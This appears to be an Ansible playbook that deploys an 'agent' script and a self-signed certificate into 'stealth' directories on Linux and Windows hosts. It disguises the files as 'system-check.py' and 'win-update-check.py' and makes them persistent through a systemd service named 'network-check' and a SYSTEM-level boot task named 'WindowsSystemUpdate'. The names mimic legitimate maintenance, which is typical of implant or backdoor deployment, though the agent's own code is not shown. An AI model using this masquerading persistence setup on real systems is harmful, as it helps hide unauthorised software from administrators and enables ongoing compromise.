---
# === LINUX AGENT DEPLOYMENT ===
- name: Ensure Linux Stealth Directory Exists
  file:
    path: "{{ agent_dest_lin }}"
    state: directory
    mode: '0755'
  when: ansible_os_family != "Windows"

- name: Deploy Linux Agent and Cert
  copy:
    src: "files/{{ item.src }}"
    dest: "{{ agent_dest_lin }}{{ item.dest }}"
    mode: "{{ item.mode | default('0644') }}"
  loop:
    - { src: "agent.py", dest: "system-check.py", mode: "0755" }
    - { src: "linux-selfsigned.crt", dest: "cert.crt" }
  when: ansible_os_family != "Windows"

- name: Setup Linux Service
  template:
    src: agent.service.j2
    dest: /etc/systemd/system/network-check.service
  when: ansible_os_family != "Windows"

- name: Start Linux Agent
  systemd:
    name: network-check
    state: restarted
    enabled: yes
  when: ansible_os_family != "Windows"

# === WINDOWS AGENT DEPLOYMENT ===
- name: Ensure Windows Stealth Directory Exists
  win_file:
    path: "{{ agent_dest_win }}"
    state: directory
  when: ansible_os_family == "Windows"

- name: Deploy Windows Agent and Cert
  win_copy:
    src: "files/{{ item.src }}"
    dest: "{{ agent_dest_win }}{{ item.dest }}"
  loop:
    - { src: "agent.py", dest: "win-update-check.py" }
    - { src: "win-selfsigned.crt", dest: "cert.crt" }
  when: ansible_os_family == "Windows"

- name: Create Scheduled Task
  win_scheduled_task:
    name: "WindowsSystemUpdate"
    actions:
      - path: python.exe
        arguments: "{{ agent_dest_win }}win-update-check.py"
    triggers: [{ type: boot }]
    username: SYSTEM
  when: ansible_os_family == "Windows"